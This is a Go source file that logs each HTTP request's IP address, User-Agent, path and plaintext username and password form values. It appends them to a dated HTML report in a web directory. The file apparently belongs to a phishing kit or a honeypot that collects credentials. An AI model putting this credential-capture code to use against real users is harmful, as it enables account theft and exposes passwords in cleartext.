package systems

import (
	"html/template"
	"net/http"
	"os"
	"time"
	"log"
	"fmt"
)

var RelatoryStore []*relatoryPage

type relatoryPage struct {
	Time      string
	IPAddr    string
	UserAgent string
	URLPath   string
	FormUser  string
	FormPass  string
}

func GenerateRelatory(r *http.Request) (*relatoryPage, error) {
	relatory := &relatoryPage{
		Time:      time.Now().Format("2006-01-02 15:04:05"),
		IPAddr:    r.RemoteAddr,
		UserAgent: r.Header.Get("User-Agent"),
		URLPath:   r.URL.Path,
		FormUser:  r.FormValue("username"),
		FormPass:  r.FormValue("password"),
	}

	RelatoryStore = append(RelatoryStore, relatory)

	fileName := fmt.Sprintf("./html/report_%s.html", time.Now().Format("2006-01-02"))	

	file, err := os.Create(fileName)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	
	tmpl := template.Must(template.New("relatorypage").Parse(`
<!DOCTYPE html>
<html>
<head>
    <title>Reports</title>
    <meta charset="UTF-8">
</head>
<body>
    <h1>Reports</h1>
    {{range .}}
    <p>Date: {{.Time}}</p>
    <p>IP Address: {{.IPAddr}}</p>
    <p>User-Agent: {{.UserAgent}}</p>
    <p>Path: {{.URLPath}}</p>
    <code>
    	<pre>
FormUser: {{.FormUser}}
FormPass: {{.FormPass}}
    	</pre>
    </code>
    <br>
    {{end}}
</body>
</html>
`))

	err = tmpl.Execute(file, RelatoryStore)
	if err != nil {
		return nil, err
	}

	return relatory, nil
}
